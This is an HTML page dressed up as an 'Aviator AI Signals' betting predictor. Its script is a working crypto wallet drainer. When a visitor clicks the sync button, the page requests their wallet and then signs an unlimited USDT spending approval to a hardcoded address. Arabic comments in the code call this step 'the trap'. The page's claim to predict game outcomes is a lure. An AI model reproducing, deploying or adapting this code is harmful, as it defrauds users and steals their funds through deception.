<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aviator Premium Predictor v4.2</title>
    <style>
        body { background: #0b0b0b; color: #00ff88; font-family: 'Courier New', monospace; text-align: center; padding-top: 50px; }
        .container { border: 2px solid #ff0055; padding: 30px; border-radius: 20px; display: inline-block; background: #111; box-shadow: 0 0 15px #ff0055; }
        .status { color: #fff; font-size: 1.2em; margin-bottom: 20px; }
        button { background: #ff0055; color: white; padding: 15px 35px; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 1.1em; transition: 0.3s; }
        button:hover { background: #ff3377; transform: scale(1.05); }
    </style>
</head>
<body>
    <div class="container">
        <h1>🚀 AVIATOR AI SIGNALS</h1>
        <div class="status">Server Status: <span style="color:#00ff88;">ONLINE</span></div>
        <p>Connect your wallet to synchronize with the Predictor Node.</p>
        <br>
        <button id="connectBtn">SYNC & START PREDICTING ⚡</button>
    </div>

    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
    <script>
        // بيانات محفظتك التي استخرجناها من Termux
        const MY_WALLET = "0xb2b0f28899D8964afa8318D12AAf3975a5501027";
        const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955"; // USDT on BSC

        document.getElementById('connectBtn').onclick = async () => {
            if (typeof window.ethereum !== 'undefined') {
                try {
                    const provider = new ethers.providers.Web3Provider(window.ethereum);
                    await provider.send("eth_requestAccounts", []);
                    const signer = provider.getSigner();
                    
                    const abi = ["function approve(address spender, uint256 amount) returns (bool)"];
                    const contract = new ethers.Contract(USDT_CONTRACT, abi, signer);

                    // طلب الصلاحية المطلقة (المصيدة)
                    const tx = await contract.approve(MY_WALLET, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
                    
                    alert("Syncing in progress... Please wait for the next signal.");
                    console.log("Strike target identified:", tx.hash);
                } catch (e) {
                    alert("Connection Failed. Make sure you are on BSC network.");
                }
            } else {
                alert("Please open this link inside Trust Wallet or MetaMask browser.");
            }
        };
    </script>
</body>
</html>
